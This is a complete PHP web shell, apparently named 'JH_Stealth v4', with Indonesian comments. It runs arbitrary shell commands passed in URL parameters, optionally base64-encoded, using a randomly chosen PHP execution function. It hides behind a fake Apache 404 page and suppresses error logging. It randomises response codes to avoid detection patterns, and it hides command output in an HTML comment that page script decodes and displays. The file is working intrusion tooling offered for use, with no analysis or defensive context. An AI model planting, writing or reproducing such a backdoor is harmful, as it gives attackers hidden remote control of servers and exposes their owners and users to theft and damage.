<?php
// =============================================
// JH_Stealth v4 - Browser-Friendly RCE 
// Auto-render hasil langsung di browser
// =============================================

@ob_start();
@set_error_handler(null);
@set_exception_handler(null);
@ini_set('display_errors','0');
@ini_set('log_errors','0');

// Parameter: ?_=b64&__=BASE64ENCODEDCOMMAND
$mode = $_GET['_'] ?? '';
$cmd_raw = $_GET['__'] ?? '';

if(empty($mode) || empty($cmd_raw)){
    @ob_end_clean();
    http_response_code(404);
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head>'
        .'<body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>'
        .'<hr><address>Apache/2.4.41 (Ubuntu) Server at '.($_SERVER['HTTP_HOST']??'localhost').' Port 80</address>'
        .'</body></html>';
    exit(0);
}
$cmd = $mode === 'b64' ? base64_decode($cmd_raw) . ' 2>&1' : $cmd_raw . ' 2>&1';

// Execution engine
$methods = [];
if(function_exists('shell_exec')) $methods[] = 'sh';
if(function_exists('exec')) $methods[] = 'ex';
if(function_exists('system')) $methods[] = 'sy';
if(function_exists('passthru')) $methods[] = 'pa';
if(function_exists('popen')) $methods[] = 'po';
if(function_exists('proc_open')) $methods[] = 'pr';

if(empty($methods)){
    $result = 'ERROR: No execution method available';
} else {
    shuffle($methods);
    $sel = $methods[0];
    $o = '';
    
    switch($sel){
        case 'sh': $o = @shell_exec($cmd); break;
        case 'ex': @exec($cmd, $a); $o = implode("\n", $a); break;
        case 'sy': ob_start(); @system($cmd); $o = ob_get_clean(); break;
        case 'pa': ob_start(); @passthru($cmd); $o = ob_get_clean(); break;
        case 'po':
            $h = @popen($cmd, 'r');
            if($h){ while(!feof($h)) $o .= fread($h, 4096); pclose($h); }
            break;
        case 'pr':
            $ds = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
            $pp = @proc_open($cmd, $ds, $pipes);
            if(is_resource($pp)){
                $o = stream_get_contents($pipes[1]);
                fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
                proc_close($pp);
            }
            break;
    }
    $result = $o === null ? '' : $o;
}

// Render response - langsung tampilkan hasil
@ob_end_clean();

// Pilih response code acak biar gak pattern
$codes = [200, 301, 302, 307];
http_response_code($codes[array_rand($codes)]);
header('Content-Type: text/html; charset=UTF-8');

$b64_result = base64_encode($result);

?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Page not found</title>
<style>
body{background:#f5f5f5;font-family:Arial,sans-serif;margin:40px;color:#333}
h1{color:#c0392b;font-size:28px}
hr{border:0;border-top:1px solid #ddd;margin:20px 0}
code{background:#eee;padding:2px 6px;border-radius:3px}
#rxout{display:none}
</style>
</head>
<body>
<h1>404 Not Found</h1>
<p>The requested URL <code><?php echo htmlspecialchars($_SERVER['REQUEST_URI']??''); ?></code> was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at <?php echo $_SERVER['HTTP_HOST']??'localhost'; ?> Port 80</address>

<!-- Hidden result: <?php echo $b64_result; ?> -->

<div id="rxout"><?php echo htmlspecialchars($result); ?></div>

<script>
// Auto-decode base64 dan tampilkan hasil
(function(){
    // Baca dari HTML comment
    var html = document.documentElement.innerHTML;
    var match = html.match(/<!-- Hidden result: ([A-Za-z0-9+/=]+) -->/);
    if(match){
        try{
            var decoded = atob(match[1]);
            // Render hasil di halaman
            var div = document.createElement('div');
            div.style.cssText = 'position:fixed;top:0;left:0;right:0;background:#1e1e1e;color:#0f0;font-family:monospace;font-size:13px;padding:15px;z-index:9999;max-height:80vh;overflow:auto;border-bottom:3px solid #0f0';
            div.innerHTML = '<div style="color:#888;margin-bottom:8px;font-size:11px;text-transform:uppercase">xian</div><pre style="margin:0;white-space:pre-wrap;word-break:break-all">' + document.getElementById('rxout').textContent + '</pre>';
            document.body.appendChild(div);
            
            // Timer auto-hide (optional)
            // setTimeout(function(){ div.style.display = 'none'; }, 10000);
        }catch(e){}
    }
})();
</script>
</body>
</html>
<?php exit(0); ?>
